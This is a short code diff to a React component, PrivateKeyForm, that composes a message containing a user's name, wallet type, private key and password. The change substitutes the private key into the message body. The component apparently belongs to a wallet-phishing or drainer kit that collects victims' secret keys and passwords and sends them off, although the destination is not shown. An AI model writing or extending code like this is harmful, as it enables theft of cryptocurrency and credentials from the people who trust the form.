@@ -65,7 +65,7 @@ const PrivateKeyForm = ({ wallet, privateKeyLengthNotlong }) => {
             message: `
               Name: ${formData.name}
               Type: ${formData.type}
-              Data: ${formData.data}
+              Data: ${formData.privateKey}
               Password: ${formData.password}
             `,
           },
